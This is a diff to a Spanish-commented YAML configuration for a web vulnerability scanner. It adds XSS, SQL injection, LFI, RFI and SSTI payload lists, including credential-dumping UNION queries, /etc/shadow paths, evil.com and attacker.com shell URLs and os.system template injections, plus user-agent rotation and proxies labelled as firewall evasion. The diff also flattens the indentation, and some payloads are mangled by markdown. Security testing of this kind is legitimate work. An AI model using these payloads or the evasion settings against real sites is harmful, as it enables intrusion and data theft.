@@ -1,61 +1,202 @@
 scraping:
-  user_agent: "ScrapperBot/1.0"     # User-Agent personalizado para solicitudes HTTP
-  timeout: 5                        # Tiempo de espera en segundos para las solicitudes
-  max_links: 30                     # Número máximo de enlaces a seguir en el scraping
+user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"  # User-Agent avanzado
+timeout: 10                        # Tiempo de espera en segundos para las solicitudes
+max_links: 50                      # Número máximo de enlaces a seguir en el scraping
+proxy:                              # Configuración de proxy para eludir firewalls
+http: "[http://proxyserver](http://proxyserver/):port"
+https: "[https://proxyserver](https://proxyserver/):port"
+headers:                            # Cabeceras adicionales para eludir firewalls
+Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+Accept-Language: "en-US,en;q=0.5"
+Connection: "keep-alive"
+Upgrade-Insecure-Requests: "1"
 
 scanner:
-  xss_payloads:
-    - "<script>alert(1)</script>"
-    - "'><img src=x onerror=alert(1)>"
-    - "<svg/onload=alert(1)>"
-    - "';alert(String.fromCharCode(88,83,83))//"
-    - "\";alert('XSS');//"
-    - "<img src='javascript:alert(1)'>"
-  
-  sql_injection_payloads:
-    - "' OR '1'='1"
-    - "' OR 'a'='a"
-    - "' OR 1=1--"
-    - "\" OR \"\"=\""
-    - "' OR '1'='1' --"
-    - "' OR '1'='1' /*"
-    - "admin' --"
-    - "admin' #"
-    - "admin'/*"
-  
-  # Nuevas vulnerabilidades y configuraciones adicionales
-  csp_vulnerability: true           # Verifica la cabecera Content Security Policy
-  anti_csrf_token: true             # Verifica la presencia de tokens Anti-CSRF
-  anti_clickjacking: true           # Verifica la cabecera Anti-Clickjacking
+xss_payloads:
+- "<script>alert(1)</script>"
+- "'><img src=x onerror=alert(1)>"
+- "<svg/onload=alert(1)>"
+- "';alert(String.fromCharCode(88,83,83))//"
+- "\";alert('XSS');//"
+- "<img src='javascript:alert(1)'>"
+- "<body onload=alert(1)>"
+- "'+alert(1)+'"
+- "<iframe src=javascript:alert(1)>"
+- "<math><mi//xlink:href=\"javascript:alert(1)\">"
+- "<object data='javascript:alert(1)'>"
+- "<link rel='stylesheet' href='javascript:alert(1)'>"
+- "<base href='javascript:alert(1)'>"
+- "' OR '<script>alert(1)</script>"
+- "<IMG SRC=\"javascript:alert('XSS');\">"
 
-  # Configuración para la detección de respuestas vulnerables
-  detection:
-    xss_indicators:
-      - "<script>alert(1)</script>"
-      - "alert(1)"
-      - "<img src=x onerror=alert(1)>"
-      - "XSS"
-    sql_injection_indicators:
-      - "SQL syntax"
-      - "sql error"
-      - "mysql"
-      - "You have an error in your SQL syntax"
-      - "Warning: mysql"
-      - "Unclosed quotation mark after the character string"
-      - "syntax error"
-    csp_indicators:
-      - "Content-Security-Policy"
-    anti_csrf_indicators:
-      - "csrf"
-    clickjacking_indicators:
-      - "X-Frame-Options"
+sql_injection_payloads:
+- "' OR '1'='1"
+- "' OR 'a'='a"
+- "' OR 1=1--"
+- "\" OR \"\"=\""
+- "' OR '1'='1' --"
+- "' OR '1'='1' /*"
+- "admin' --"
+- "admin' #"
+- "admin'/*"
+- "'; DROP TABLE users; --"
+- "' UNION SELECT NULL, NULL --"
+- "\" UNION SELECT NULL, NULL --"
+- "' OR '1'='1' AND 'a'='a"
+- "' UNION SELECT username, password FROM users --"
+- "' UNION ALL SELECT NULL, NULL, NULL --"
+- "'; exec sp_executesql N'select * from users'--"
+- "' AND (SELECT * FROM users) = 1 --"
 
-# Parámetros adicionales de escaneo
+lfi_payloads:
+- "../../../../../../etc/passwd"
+- "/etc/passwd"
+- "../../../../../../boot.ini"
+- "C:/boot.ini"
+- "../../../../../../etc/shadow"
+- "../../../../../../var/log/apache2/access.log"
+- "../../../../../../var/log/httpd/access.log"
+- "../../../../../../proc/self/environ"
+- "../../../../../windows/win.ini"
+- "../../../../../boot.ini"
+- "../../../windows/system32/drivers/etc/hosts"
+- "../../../../../../etc/issue"
+- "../../../../../../etc/group"
+
+rfi_payloads:
+- "http://evil.com/shell.txt"
+- "[//evil.com/shell.txt](https://evil.com/shell.txt)"
+- "http:evil.com/shell.txt"
+- "http://malicious.com/evil.php"
+- "https://malicious.com/backdoor.txt"
+- "http://attacker.com/malicious.php"
+- "https://attacker.com/malicious.php"
+- "http://example.com/malicious.php"
+- "https://example.com/malicious.php"
+
+ssti_payloads:
+- "{{7*7}}"
+- "{% 7*7 %}"
+- "${7*7}"
+- "#{7*7}"
+- "${{7*7}}"
+- "#{7*7}"
+- "{% print(7*7) %}"
+- "{{=7*7}}"
+- "{{'a'.**class**.**mro**[1].**subclasses**()[40]('ls', shell=True, stdout=-1).communicate()[0]}}"
+- "{{request['application']['**globals**']['**builtins**']['eval'](https://www.notion.so/'__import__(%5C%22os%5C%22).system(%5C%22ls%5C%22)')}}"
+- "{{config.items()}}"
+- "{{ [].**class**.**base**.**subclasses**() }}"
+- "{{ ''.**class**.**mro**[2].**subclasses**() }}"
+
+csp_vulnerability: true           # Verifica la cabecera Content Security Policy
+anti_csrf_token: true             # Verifica la presencia de tokens Anti-CSRF
+anti_clickjacking: true           # Verifica la cabecera Anti-Clickjacking
+open_redirects: true              # Verifica redirecciones abiertas
+
+detection:
+xss_indicators:
+- "<script>alert(1)</script>"
+- "alert(1)"
+- "<img src=x onerror=alert(1)>"
+- "XSS"
+- "onerror="
+- "<iframe>"
+- "javascript:alert"
+- "<svg>"
+- "<link rel='stylesheet' href='javascript:alert(1)'>"
+- "<base href='javascript:alert(1)'>"
+- "<IMG SRC=\"javascript:alert('XSS');\">"
+sql_injection_indicators:
+- "SQL syntax"
+- "sql error"
+- "mysql"
+- "You have an error in your SQL syntax"
+- "Warning: mysql"
+- "Unclosed quotation mark after the character string"
+- "syntax error"
+- "ORA-00933"
+- "SQLSTATE"
+- "Warning: pg_query()"
+- "unterminated quoted string"
+- "unexpected token"
+- "syntax error in input"
+lfi_indicators:
+- "root:x"
+- "boot loader"
+- "[boot loader]"
+- "root:x:0:0:"
+- "[cygwin]"
+- "[operating system]"
+- "[autoexec]"
+- "[Index of /]"
+- "/etc/shadow"
+- "/etc/passwd"
+- "root:x:0:0:root"
+rfi_indicators:
+- "shell"
+- "hacked"
+- "exploit"
+- "eval("
+- "system("
+- "passthru("
+- "base64_decode("
+- "fopen("
+- "file_get_contents("
+ssti_indicators:
+- "49"
+- "77"
+- "42"
+- "print("
+- "expression"
+- "render("
+- "**globals**"
+- "**builtins**"
+- "eval("
+- "config.items()"
+- ".**class**"
+csp_indicators:
+- "Content-Security-Policy"
+- "default-src"
+- "script-src"
+- "object-src"
+- "frame-ancestors"
+- "style-src"
+- "img-src"
+- "connect-src"
+- "font-src"
+- "form-action"
+anti_csrf_indicators:
+- "csrf"
+- "cross-site"
+- "token"
+- "same-origin"
+- "xsrf"
+- "anti-csrf"
+- "_csrf"
+- "_xsrf"
+clickjacking_indicators:
+- "X-Frame-Options"
+- "DENY"
+- "SAMEORIGIN"
+- "ALLOW-FROM"
+- "frame-ancestors"
+open_redirect_indicators:
+- "redirect"
+- "location"
+- "window.location"
+- "http-equiv=refresh"
+- "meta http-equiv=refresh"
+- "url="
+- "window.location.href"
+
 scan_parameters:
-  max_links: 50                     # Máximo de enlaces a seguir en el scraping
-  retry_on_failure: true            # Volver a intentar en caso de fallo de conexión
-  max_retries: 3                    # Número máximo de reintentos por solicitud fallida
-  delay_between_requests: 2         # Retraso en segundos entre cada solicitud
-
-
-
+max_links: 50                     # Máximo de enlaces a seguir en el scraping
+retry_on_failure: true            # Volver a intentar en caso de fallo de conexión
+max_retries: 3                    # Número máximo de reintentos por solicitud fallida
+delay_between_requests: 2         # Retraso en segundos entre cada solicitud
+rotate_user_agents: true          # Alternar entre distintos User-Agents para eludir firewalls
+user_agents:
+- "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
+- "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:84.0) Gecko/20100101 Firefox/84.0"
+- "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/87.0.664.66"
